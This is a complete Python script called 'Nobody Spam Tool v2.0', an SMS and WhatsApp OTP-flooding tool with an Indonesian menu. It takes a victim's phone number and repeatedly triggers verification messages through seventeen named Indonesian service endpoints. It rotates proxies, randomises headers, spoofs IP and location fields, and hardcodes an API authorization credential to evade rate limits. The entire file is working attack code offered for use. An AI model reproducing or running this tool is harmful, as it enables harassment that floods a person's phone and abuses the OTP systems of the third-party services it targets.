#!/usr/bin/env python3


import os
import sys
import time
import json
import datetime
import random
import asyncio
import logging
import signal
import traceback
from pathlib import Path
from dataclasses import dataclass
from typing import Optional


# ═══════════════════════════════════════════════════════════
#  IMPORT CHECK — fail early with a clear message
# ═══════════════════════════════════════════════════════════

def _check_aiohttp():
    """Try importing aiohttp; if missing, offer to install."""
    try:
        import aiohttp
        return aiohttp
    except ImportError:
        print(f"\n\033[93m[!] aiohttp belum terinstall.\033[0m")
        print(f"\033[96m[*] Mencoba install otomatis...\033[0m")
        ret = os.system(f"{sys.executable} -m pip install aiohttp --quiet --disable-pip-version-check")
        if ret == 0:
            try:
                import aiohttp
                print(f"\033[92m[✓] aiohttp berhasil diinstall!\033[0m")
                return aiohttp
            except ImportError:
                pass
        # Second attempt — try with --no-build-isolation for Termux
        print(f"\033[93m[*] Coba install dengan --no-build-isolation (Termux)...\033[0m")
        ret = os.system(f"{sys.executable} -m pip install aiohttp --no-build-isolation --quiet")
        if ret == 0:
            try:
                import aiohttp
                print(f"\033[92m[✓] aiohttp berhasil diinstall!\033[0m")
                return aiohttp
            except ImportError:
                pass
        print(f"\033[91m[✗] Gagal install aiohttp. Install manual:\033[0m")
        print(f"\033[97m    pkg install rust && pip install aiohttp\033[0m")
        print(f"\033[97m    # atau: MATHLAPACK=0 pip install aiohttp\033[0m")
        sys.exit(1)

aiohttp = _check_aiohttp()

# ═══════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════

@dataclass
class Config:
    proxy_file: str = "proxies.txt"
    proxy_timeout: int = 8
    proxy_cooldown_ban: float = 60.0
    proxy_max_failures: int = 3

    max_concurrent: int = 10
    tcp_limit: int = 200
    request_timeout: int = 12
    retry_count: int = 3
    retry_backoff_base: float = 1.5
    cooldown_min: float = 1.0
    cooldown_max: float = 3.5

    api_rate_limit: float = 2.0

    max_phone_digits: int = 15
    min_phone_digits: int = 9

CFG = Config()

# ═══════════════════════════════════════════════════════════
#  COLOURS — Professional Palette
# ═══════════════════════════════════════════════════════════

TEAL    = '\033[38;5;36m'
GRAY    = '\033[38;5;245m'
HIJAU   = '\033[92m'
MERAH   = '\033[91m'
CYAN    = '\033[96m'
PUTIH   = '\033[97m'
RESET   = '\033[0m'
BOLD    = '\033[1m'
DIM     = '\033[2m'

# ═══════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════

logging.basicConfig(
    filename='attack.log',
    filemode='a',
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    level=logging.INFO,
)
logger = logging.getLogger('WEAIIN')

_stderr_h = logging.StreamHandler(sys.stderr)
_stderr_h.setLevel(logging.WARNING)
_stderr_h.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
logger.addHandler(_stderr_h)

# ═══════════════════════════════════════════════════════════
#  USER AGENTS (expanded)
# ═══════════════════════════════════════════════════════════

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
]

ACCEPT_VARIANTS = [
    'application/json, text/plain, */*',
    'application/json',
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
]

LANG_VARIANTS = [
    'en-US,en;q=0.9',
    'id-ID,id;q=0.8,en;q=0.7',
    'en;q=0.7',
    'id;q=0.9,en;q=0.8',
]

# ═══════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════

def normalize_phone(raw: str) -> dict:
    digits = ''.join(c for c in raw if c.isdigit())
    if not digits:
        raise ValueError("Nomor tidak mengandung digit apapun.")

    if digits.startswith('628'):
        local = '0' + digits[2:]
        base = digits[2:]
    elif digits.startswith('08') or digits.startswith('07'):
        local = digits
        base = digits[1:]
    elif digits.startswith('8') or digits.startswith('7'):
        local = '0' + digits
        base = digits
    else:
        local = '0' + digits
        base = digits

    if not (CFG.min_phone_digits <= len(digits) <= CFG.max_phone_digits):
        raise ValueError(
            f"Panjang nomor ({len(digits)}) di luar rentang "
            f"{CFG.min_phone_digits}-{CFG.max_phone_digits}."
        )

    return {
        'raw':          raw.strip(),
        'digits':       digits,
        'with_0':       local,
        'with_62':      '62' + local.lstrip('0'),
        'with_plus':    '+62' + local.lstrip('0'),
        'with_plus620': '+620' + local.lstrip('0'),
        'with_spasi':   '+62 ' + local.lstrip('0')[1:],
        'local8':       base,
    }


def random_headers(extra: Optional[dict] = None) -> dict:
    h = {
        'User-Agent':      random.choice(USER_AGENTS),
        'Accept':          random.choice(ACCEPT_VARIANTS),
        'Accept-Language': random.choice(LANG_VARIANTS),
        'Cache-Control':   'no-cache',
        'Connection':      'keep-alive',
    }
    if extra:
        h.update(extra)
    return h


# ═══════════════════════════════════════════════════════════
#  PROXY MANAGER
# ═══════════════════════════════════════════════════════════

class ProxyManager:
    def __init__(self, proxies: list):
        self._all = proxies[:]
        self._available = proxies[:]
        self._blacklist: dict = {}
        self._failures: dict = {}
        self._idx = 0
        self._lock = asyncio.Lock()

    @property
    def count(self) -> int:
        return len(self._available)

    async def get(self) -> Optional[str]:
        if not self._all:
            return None
        async with self._lock:
            self._rehabilitate()
            if not self._available:
                logger.warning("All proxies blacklisted — fallback to random.")
                return random.choice(self._all)
            proxy = self._available[self._idx % len(self._available)]
            self._idx += 1
            return proxy

    async def report_success(self, proxy: Optional[str]):
        if not proxy:
            return
        async with self._lock:
            self._failures.pop(proxy, None)

    async def report_failure(self, proxy: Optional[str]):
        if not proxy:
            return
        async with self._lock:
            count = self._failures.get(proxy, 0) + 1
            self._failures[proxy] = count
            if count >= CFG.proxy_max_failures:
                self._blacklist[proxy] = time.time() + CFG.proxy_cooldown_ban
                if proxy in self._available:
                    self._available.remove(proxy)
                logger.warning(f"Proxy blacklisted: {proxy[:40]}…")

    def _rehabilitate(self):
        now = time.time()
        expired = [p for p, t in self._blacklist.items() if t <= now]
        for p in expired:
            del self._blacklist[p]
            self._failures[p] = 0
            if p not in self._available:
                self._available.append(p)
                logger.info(f"Proxy rehabilitated: {p[:40]}…")


# ═══════════════════════════════════════════════════════════
#  STATS TRACKER
# ═══════════════════════════════════════════════════════════

class Stats:
    def __init__(self):
        self._data: dict = {}
        self._lock = asyncio.Lock()
        self.start_time: float = time.time()

    async def record(self, api_name: str, status: Optional[int], elapsed_ms: float):
        async with self._lock:
            if api_name not in self._data:
                self._data[api_name] = {'ok': 0, 'fail': 0, 'last': None, 'ms': 0.0, 'hits': 0}
            d = self._data[api_name]
            d['hits'] += 1
            d['ms'] += elapsed_ms
            d['last'] = status
            if status and 200 <= status < 400:
                d['ok'] += 1
            else:
                d['fail'] += 1

    async def summary(self) -> str:
        async with self._lock:
            elapsed = time.time() - self.start_time
            lines = [
                f"\n{BOLD}{CYAN}═══════════════ SESSION STATS ═══════════════{RESET}",
                f"  Durasi   : {elapsed:.1f}s",
                f"  {'API':<26} {'OK':>5} {'FAIL':>5} {'HITS':>5} {'AVGms':>7} {'LAST':>5}",
                f"  {'─' * 55}",
            ]
            total_ok = total_fail = total_hits = 0
            for name, d in sorted(self._data.items()):
                avg = d['ms'] / d['hits'] if d['hits'] else 0
                lines.append(
                    f"  {name:<26} {d['ok']:>5} {d['fail']:>5} {d['hits']:>5} {avg:>7.0f} {str(d['last'] or '-'):>5}"
                )
                total_ok += d['ok']
                total_fail += d['fail']
                total_hits += d['hits']
            lines.append(f"  {'─' * 55}")
            lines.append(f"  {'TOTAL':<26} {total_ok:>5} {total_fail:>5} {total_hits:>5}")
            rate = (total_ok / total_hits * 100) if total_hits else 0
            lines.append(f"  {HIJAU}Success Rate: {rate:.1f}%{RESET}")
            lines.append(f"{CYAN}══════════════════════════════════════════════{RESET}\n")
            return '\n'.join(lines)


# ═══════════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════════

SHUTDOWN = asyncio.Event()

def _signal_handler(sig, frame):
    logger.info(f"Signal {sig} received — shutting down.")
    SHUTDOWN.set()

# ─── Rate‑limit per API ───
_api_last_call: dict = {}

async def rate_limit_wait(api_name: str):
    last = _api_last_call.get(api_name, 0.0)
    now = time.time()
    diff = CFG.api_rate_limit - (now - last)
    if diff > 0:
        await asyncio.sleep(diff)
    _api_last_call[api_name] = time.time()


# ═══════════════════════════════════════════════════════════
#  HTTP REQUEST WRAPPER (uses global aiohttp)
# ═══════════════════════════════════════════════════════════

async def safe_request(
    session,
    method: str,
    url: str,
    proxy: Optional[str],
    *,
    api_name: str = "unknown",
    **kwargs,
):
    """
    Retry-aware HTTP request with exponential backoff.
    Returns (status_code, elapsed_ms).
    """
    for attempt in range(1, CFG.retry_count + 1):
        t0 = time.monotonic()
        try:
            await rate_limit_wait(api_name)
            timeout_val = aiohttp.ClientTimeout(total=CFG.request_timeout)
            kwargs.setdefault('timeout', timeout_val)

            async with session.request(method, url, proxy=proxy, **kwargs) as resp:
                elapsed = (time.monotonic() - t0) * 1000
                status = resp.status

                # 429 Too Many Requests → backoff + retry
                if status == 429 and attempt < CFG.retry_count:
                    wait = CFG.retry_backoff_base ** attempt + random.uniform(0.3, 1.0)
                    logger.warning(f"{api_name} 429 — retry in {wait:.1f}s (attempt {attempt})")
                    await asyncio.sleep(wait)
                    continue

                return status, elapsed

        except asyncio.TimeoutError:
            elapsed = (time.monotonic() - t0) * 1000
            logger.warning(f"{api_name} TIMEOUT (attempt {attempt}/{CFG.retry_count})")

        except aiohttp.ClientError as e:
            elapsed = (time.monotonic() - t0) * 1000
            logger.error(f"{api_name} ClientError attempt {attempt}: {type(e).__name__}: {e}")

        except OSError as e:
            elapsed = (time.monotonic() - t0) * 1000
            logger.error(f"{api_name} OSError attempt {attempt}: {type(e).__name__}: {e}")

        except Exception as e:
            elapsed = (time.monotonic() - t0) * 1000
            logger.error(f"{api_name} UNEXPECTED attempt {attempt}: {type(e).__name__}: {e}")
            logger.debug(traceback.format_exc())

        # Backoff before next attempt
        if attempt < CFG.retry_count:
            wait = CFG.retry_backoff_base ** attempt + random.uniform(0.2, 0.8)
            await asyncio.sleep(wait)

    return None, elapsed


# ═══════════════════════════════════════════════════════════
#  API IMPLEMENTATIONS
# ═══════════════════════════════════════════════════════════

async def api_bonusbelanja(session, phone: dict, proxy) -> tuple:
    name = "Bonusbelanja"
    url = "https://www.bonusbelanja.com/api/auth/registration/app"
    headers = random_headers({"Content-Type": "application/json"})
    payload = {"agreeContact": True, "agreeTnc": True, "name": "Ucup", "phone": phone['with_62']}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_bunda(session, phone: dict, proxy) -> tuple:
    name = "Bunda"
    url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
    headers = random_headers({"Content-Type": "application/json"})
    payload = {"phone_number": phone['with_62'], "type": "auth"}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_duniagames(session, phone: dict, proxy) -> tuple:
    name = "Duniagames"
    url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
    headers = random_headers({
        "Content-Type": "application/json",
        "Origin": "https://duniagames.co.id",
        "Referer": "https://duniagames.co.id/",
    })
    payload = {"phoneNumber": phone['with_0']}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_viuum(session, phone: dict, proxy) -> tuple:
    name = "Viuum"
    url = "https://api.viuum.co.id/api_viuum/v1/customer/one-time"
    headers = random_headers({
        "Content-Type": "application/json",
        "Origin": "https://wearviuum.com",
    })
    payload = {"number": phone['with_62']}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_mengantar(session, phone: dict, proxy) -> tuple:
    name = "Mengantar"
    url = "https://app.mengantar.com/api/auth/send-verification-code"
    headers = random_headers({"Content-Type": "application/json;charset=UTF-8"})
    payload = {
        "courier": "JNE",
        "email": "mamangucup@gmail.com",
        "language": "id",
        "name": "Ucup mamang",
        "phone": phone['with_0'],
        "subject": "register",
        "verificationType": "whatsapp",
    }
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_paperid(session, phone: dict, proxy) -> tuple:
    name = "PaperId"
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    headers = random_headers({"Content-Type": "application/json"})
    payload = {"method": "whatsapp", "phone": phone['with_62'], "registered_by": "web"}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_rumah123(session, phone: dict, proxy) -> tuple:
    name = "Rumah123"
    url = "https://www.rumah123.com/api/otp/request-otp"
    headers = random_headers({
        "Content-Type": "application/json",
        "Base-Url-Core": "https://https://www.rumah123.com",
    })
    payload = {
        "ipAddress": f"{random.randint(101,220)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        "phoneNumber": phone['with_62'],
        "portalId": 1,
        "type": "WHATSAPP",
        "url": "https://www.rumah123.com/user/login",
    }
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_planetban(session, phone: dict, proxy) -> tuple:
    name = "Planetban"
    url = "https://api.planetban.com/website/customer/request-otp"
    headers = random_headers({
        "Content-Type": "application/json",
        "Origin": "https://planetban.com",
        "Referer": "https://planetban.com/",
    })
    payload = {"phone": phone['with_0'], "purpose": "register", "method": "whatsapp"}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_uangme(session, phone: dict, proxy) -> tuple:
    name = "Uangme"
    url = "https://h5.uangme.id/api/v2/sms_code"
    headers = random_headers({
        "Accept": "application/json",
        "App_version": "999999",
        "Lan": "id-ID",
        "Referer": "https://h5.uangme.id/",
    })
    params = {"send_type": "sms", "phone": phone['local8'], "scene_type": "login"}
    status, ms = await safe_request(session, 'GET', url, proxy, api_name=name, headers=headers, params=params)
    await stats.record(name, status, ms)
    return name, status

async def api_speedcash(session, phone: dict, proxy) -> tuple:
    name = "Speedcash"
    url = "https://member.speedcash.co.id/api/twice/otp/generate"
    headers = random_headers({
        "Content-Type": "application/json",
        "Origin": "https://member.speedcash.co.id",
        "Referer": "https://member.speedcash.co.id/",
    })
    uid = f"{random.randint(10000000,99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}"
    payload = {
        "app_id": "SPEEDCASH",
        "appid": "SPEEDCASH",
        "location": f"{random.uniform(-6.5,-6.1):.4f},{random.uniform(106.6,107.0):.4f}",
        "phone": phone['with_0'],
        "state": "REGISTER",
        "type": "WA",
        "user_uuid": uid,
        "uuid": uid,
        "version_code": "270",
        "version_name": "3.2.0",
        "via": "BB MOBILE WEB",
    }
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_toyota(session, phone: dict, proxy) -> tuple:
    name = "Toyota"
    url = "https://data-web.tam-icm.com/api/public/vendors/tokenize"
    headers = random_headers({
        "Accept": "application/json",
        "Authorization": "Basic ZGlkeDpUb3IvdGEyMDI0",
        "Content-Type": "application/json",
        "Origin": "https://www.toyota.astra.co.id",
        "Referer": "https://www.toyota.astra.co.id/",
    })
    payload = {"data": [phone['with_0'], "Ucup maniaz", "ucupmaill@gmail.com"]}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_kreditpintar(session, phone: dict, proxy) -> tuple:
    name = "Kreditpintar"
    url = "https://go.kreditpintar.com/api/auth/send-code"
    headers = random_headers({
        "Content-Type": "application/json",
        "Origin": "https://go.kreditpintar.com",
        "Referer": "https://go.kreditpintar.com/",
    })
    params = {"channel": "OFFICIAL2021", "lang": "id"}
    payload = {"mobileNumber": phone['with_plus620'], "type": "SMS"}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, params=params, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_astradaihatsu(session, phone: dict, proxy) -> tuple:
    name = "AstraDaihatsu"
    url = "https://www.astra-daihatsu.id/register/validate-pre-register"
    headers = random_headers({
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/",
    })
    csrf = f"{random.randint(10000000,99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}"
    payload = {
        "email": "ucupmaill@gmail.com",
        "phoneNumber": phone['with_spasi'],
        "CSRFToken": csrf,
    }
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, data=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_pinhome(session, phone: dict, proxy) -> tuple:
    name = "Pinhome"
    url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
    headers = random_headers({
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": "https://www.pinhome.id",
        "Referer": "https://www.pinhome.id/",
    })
    payload = {
        "accountType": "customers",
        "applicationType": "Pinhome Web",
        "countryCode": "62",
        "medium": "whatsapp",
        "otpType": "register",
        "phoneNumber": phone['local8'],
    }
    status, ms = await safe_request(
        session, 'POST', url, proxy, api_name=name,
        headers=headers, data=json.dumps(payload),
    )
    await stats.record(name, status, ms)
    return name, status

async def api_tokopedia(session, phone: dict, proxy) -> tuple:
    name = "Tokopedia"
    url = "https://accounts.tokopedia.com/otp/c/page"
    headers = random_headers({
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://accounts.tokopedia.com",
        "Referer": "https://accounts.tokopedia.com/otp",
    })
    data = {
        "otp_type": "116",
        "msisdn": phone['with_62'],
        "ldate": str(int(time.time())),
    }
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, data=data)
    await stats.record(name, status, ms)
    return name, status

async def api_bukalapak(session, phone: dict, proxy) -> tuple:
    name = "Bukalapak"
    url = "https://accounts.bukalapak.com/phone_number/verifications"
    headers = random_headers({
        "Content-Type": "application/json",
        "Origin": "https://accounts.bukalapak.com",
        "Referer": "https://accounts.bukalapak.com/",
    })
    payload = {"phone_number": phone['with_62']}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status

async def api_shopee(session, phone: dict, proxy) -> tuple:
    name = "Shopee"
    url = "https://shopee.co.id/api/v2/authentication/send_otp"
    headers = random_headers({
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://shopee.co.id",
        "Referer": "https://shopee.co.id/",
    })
    payload = {"phone": phone['with_62'], "type": 3}
    status, ms = await safe_request(session, 'POST', url, proxy, api_name=name, headers=headers, json=payload)
    await stats.record(name, status, ms)
    return name, status


# ═══════════════════════════════════════════════════════════
#  API REGISTRY
# ═══════════════════════════════════════════════════════════

API_FUNCS = [
    api_bonusbelanja,
    api_bunda,
    api_duniagames,
    api_viuum,
    api_mengantar,
    api_paperid,
    api_rumah123,
    api_planetban,
    api_uangme,
    api_speedcash,
    api_toyota,
    api_kreditpintar,
    api_astradaihatsu,
    api_pinhome,
    api_tokopedia,
    api_bukalapak,
    api_shopee,
]

# ═══════════════════════════════════════════════════════════
#  ATTACK ENGINE
# ═══════════════════════════════════════════════════════════

# global stats instance (set in main)
stats: Stats = Stats()

async def attack_loop(target_raw: str, proxy_mgr: ProxyManager):
    """Main attack loop."""
    global stats
    stats = Stats()

    phone = normalize_phone(target_raw)
    connector = aiohttp.TCPConnector(limit=CFG.tcp_limit, force_close=False, enable_cleanup_closed=True)
    timeout_cfg = aiohttp.ClientTimeout(total=CFG.request_timeout)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
        sem = asyncio.Semaphore(CFG.max_concurrent)
        loop_count = 0

        while not SHUTDOWN.is_set():
            loop_count += 1
            t_loop = time.monotonic()
            shuffled = random.sample(API_FUNCS, len(API_FUNCS))

            print(f"\n{CYAN} ╔══ LOOP {loop_count} {'═' * 38}{RESET}")
            print(f"{CYAN} ║  Target : {PUTIH}{phone['with_0']}  {CYAN}Proxies: {PUTIH}{proxy_mgr.count}{RESET}")
            print(f"{CYAN} ╚{'═' * 48}{RESET}")

            async def _worker(fn):
                if SHUTDOWN.is_set():
                    return (fn.__name__, None)
                async with sem:
                    proxy = await proxy_mgr.get()
                    try:
                        name, status = await fn(session, phone, proxy)
                    except Exception as e:
                        logger.error(f"Worker {fn.__name__} crashed: {e}")
                        logger.debug(traceback.format_exc())
                        return (fn.__name__, None)
                    if proxy:
                        if status and 200 <= status < 400:
                            await proxy_mgr.report_success(proxy)
                        elif status is None:
                            await proxy_mgr.report_failure(proxy)
                    return (name, status)

            tasks = [_worker(fn) for fn in shuffled]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            ok = fail = 0
            for r in results:
                if isinstance(r, BaseException):
                    logger.error(f"Gather exception: {r}")
                    fail += 1
                    continue
                _name, code = r
                if code and 200 <= code < 400:
                    ok += 1
                    print(f"  {HIJAU}✓{RESET} {_name:<24} {HIJAU}{code}{RESET}")
                else:
                    fail += 1
                    colour = MERAH if code else DIM
                    print(f"  {MERAH}✗{RESET} {_name:<24} {colour}{code or 'ERR'}{RESET}")

            elapsed_loop = time.monotonic() - t_loop
            print(f"\n  {HIJAU}OK: {ok}{RESET}  {MERAH}FAIL: {fail}{RESET}  {DIM}({elapsed_loop:.1f}s){RESET}")

            if SHUTDOWN.is_set():
                break

            # Non-blocking cooldown — CTRL+C works instantly
            cooldown = random.uniform(CFG.cooldown_min, CFG.cooldown_max)
            print(f"  {TEAL}⏳ Cooldown {cooldown:.1f}s — Ctrl+C untuk berhenti{RESET}")

            try:
                await asyncio.wait_for(SHUTDOWN.wait(), timeout=cooldown)
                break
            except asyncio.TimeoutError:
                pass

    # Print session summary
    print(await stats.summary())


# ═══════════════════════════════════════════════════════════
#  PROXY LOADER
# ═══════════════════════════════════════════════════════════

def load_proxies(filename: str = 'proxies.txt') -> list:
    path = Path(filename)
    if not path.exists():
        print(f"{TEAL}[!] File {filename} tidak ditemukan. Tanpa proxy.{RESET}")
        logger.warning(f"Proxy file {filename} not found.")
        return []
    with open(path, 'r') as f:
        raw = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    seen = set()
    proxies = []
    for p in raw:
        if p in seen:
            continue
        seen.add(p)
        if '://' in p:
            proxies.append(p)
        else:
            proxies.append(f"http://{p}")
            logger.info(f"Auto-prefixed proxy: http://{p}")
    if proxies:
        print(f"{HIJAU}[+] {len(proxies)} proxy dimuat dari {filename}.{RESET}")
    else:
        print(f"{MERAH}[!] Tidak ada proxy valid di {filename}.{RESET}")
    return proxies


# ═══════════════════════════════════════════════════════════
#  UI (Cleaned & Professional)
# ═══════════════════════════════════════════════════════════

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def buka_link(url: str):
    for cmd in [
        f'am start -a android.intent.action.VIEW -d "{url}" > /dev/null 2>&1',
        f'termux-open-url "{url}" > /dev/null 2>&1',
        f'xdg-open "{url}" > /dev/null 2>&1',
    ]:
        if os.system(cmd) == 0:
            return


def show_banner():
    clear_screen()
    print(f"""
{TEAL}╔══════════════════════════════════════╗
{TEAL}║ {BOLD}Nobody Spam Tool v2.0{RESET}{TEAL}            ║
{TEAL}║ {GRAY}Precision SMS Flooding{RESET}{TEAL}            ║
{TEAL}╚══════════════════════════════════════╝{RESET}

{GRAY}[1] {BOLD}🚀 Start Attack{RESET}
{TEAL}[2] {BOLD}🌐 Visit nobody0x.com{RESET}
{MERAH}[0] {BOLD}Exit{RESET}
""")


def loading_awal():
    clear_screen()
    print(f"\n{TEAL} ╔═══════════════════════════════════════════════════════╗")
    print(f"{TEAL} ║ {GRAY}[!] Menginisialisasi Nobody Spam Tool v2.0...      {TEAL}║")
    print(f"{TEAL} ╚═══════════════════════════════════════════════════════╝{RESET}")
    time.sleep(1)

    steps = [
        "Memuat konfigurasi engine...",
        "Memverifikasi koneksi proxy...",
        "Sinkronisasi endpoint API...",
        "Memuat payload database...",
        "Finalisasi bypass keamanan...",
    ]
    for i, step in enumerate(steps, 1):
        bar_len = 30
        for j in range(bar_len + 1):
            pct = j / bar_len * 100
            filled = '█' * j + '░' * (bar_len - j)
            sys.stdout.write(f"\r{TEAL}[{filled}] {pct:5.1f}% {GRAY}{step}{RESET}")
            sys.stdout.flush()
            time.sleep(0.02 + random.uniform(0, 0.02))
        print()

    print(f"\n{HIJAU}[✓] Sistem siap. Kunjungi {TEAL}nobody0x.com{RESET}{HIJAU} untuk info lebih lanjut.{RESET}")
    time.sleep(0.8)


# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════

def main():
    # Graceful shutdown signals
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            signal.signal(sig, _signal_handler)
        except (OSError, ValueError):
            pass

    loading_awal()
    proxy_list = load_proxies(CFG.proxy_file)

    while True:
        show_banner()
        pilihan = input(
            f" {TEAL}╔══[{HIJAU} P I L I H  M E N U {TEAL}]\n"
            f" {TEAL}╚══> {PUTIH}"
        ).strip()
        print(RESET, end="")

        if pilihan in ('1', '01'):
            target = input(
                f"\n{HIJAU} Nomor Target (contoh: {TEAL}08xxxxxxxxxx{HIJAU}):{RESET}\n"
                f" {TEAL}╔══[{HIJAU} N O M O R {TEAL}]\n"
                f" {TEAL}╚══> {PUTIH}"
            ).strip()

            if not target:
                print(f"{MERAH}[!] Nomor tidak boleh kosong.{RESET}")
                time.sleep(1.5)
                continue

            try:
                phone_preview = normalize_phone(target)
            except ValueError as e:
                print(f"{MERAH}[!] {e}{RESET}")
                time.sleep(2)
                continue

            clear_screen()
            print(f"""
{CYAN}╔═══════════════════════════════════════════════════════╗
{CYAN}║  {TEAL}TARGET CONFIRMED{CYAN}                                    ║
{CYAN}║  Raw     : {PUTIH}{target:<40}{CYAN}║
{CYAN}║  Normal  : {PUTIH}{phone_preview['with_0']:<40}{CYAN}║
{CYAN}║  APIs    : {PUTIH}{len(API_FUNCS)} endpoints{CYAN}                           ║
{CYAN}║  Proxies : {PUTIH}{len(proxy_list)} loaded{CYAN}                             ║
{CYAN}║  Concurr : {PUTIH}{CFG.max_concurrent}{CYAN} parallel workers                    ║
{CYAN}╚═══════════════════════════════════════════════════════╝{RESET}
""")
            SHUTDOWN.clear()
            proxy_mgr = ProxyManager(proxy_list)

            try:
                asyncio.run(attack_loop(target, proxy_mgr))
            except KeyboardInterrupt:
                print(f"\n{MERAH}[!] Dihentikan oleh user.{RESET}")
                time.sleep(1)
            except Exception as e:
                logger.exception("Fatal error in attack loop")
                print(f"{MERAH}[!] Fatal: {e}{RESET}")
                traceback.print_exc()
                time.sleep(2)

        elif pilihan == '2':
            buka_link("https://nobody0x.com")
            print(f"{TEAL}[*] Membuka nobody0x.com ...{RESET}")
            time.sleep(0.5)

        elif pilihan in ('0', '00'):
            print(f"\n{HIJAU}[*] Sistem Dimatikan. Sampai jumpa di lain misi!{RESET}")
            break

        else:
            print(f"{MERAH}[!] Perintah tidak dikenal: '{pilihan}'{RESET}")
            kalimat = random.choice([
                "Coba lagi ya bos.",
                "Menu tidak valid bos.",
                "Pilih angka yang bener dong.",
                "Input salah cuy.",
            ])
            print(f"{TEAL}[*] {kalimat}{RESET}")
            time.sleep(1.5)


# ═══════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    main()